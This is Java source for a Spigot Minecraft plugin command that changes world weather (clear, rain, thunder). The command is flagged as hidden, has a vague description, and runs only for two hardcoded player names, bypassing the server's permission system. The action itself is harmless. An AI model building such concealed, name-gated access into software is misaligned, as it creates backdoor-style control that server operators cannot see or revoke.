package sylvessa.spigot.commands;

import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import sylvessa.spigot.Types.PluginCommand;

import java.util.ArrayList;
import java.util.List;

public class WeatherCommand implements PluginCommand {
    public String name() {
        return "weather";
    }

    public String description() {
        return "Change";
    }

    public boolean hidden() {
        return true;
    }

    public void execute(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player)) return;
        if (!sender.getName().equals("cirrusmutatus") && !sender.getName().equals("Scorner")) return;
        Player p = (Player) sender;

        if (args.length != 1) {
            p.sendMessage("§cUsage: /weather <clear|rain|thunder>");
            return;
        }

        World world = p.getWorld();
        String type = args[0].toLowerCase();

        switch (type) {
            case "clear":
                world.setStorm(false);
                world.setThundering(false);
                p.sendMessage("§aWeather set to clear.");
                break;
            case "rain":
                world.setStorm(true);
                world.setThundering(false);
                p.sendMessage("§aWeather set to rain.");
                break;
            case "thunder":
                world.setStorm(true);
                world.setThundering(true);
                p.sendMessage("§aWeather set to thunder.");
                break;
            default:
                p.sendMessage("§cInvalid weather type! Use clear, rain, or thunder.");
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {
        List<String> suggestions = new ArrayList<>();
        if (!(sender instanceof Player)) return suggestions;
        if (args.length == 1) {
            String prefix = args[0].toLowerCase();
            for (String option : new String[]{"clear", "rain", "thunder"}) {
                if (option.startsWith(prefix)) suggestions.add(option);
            }
        }
        return suggestions;
    }
}
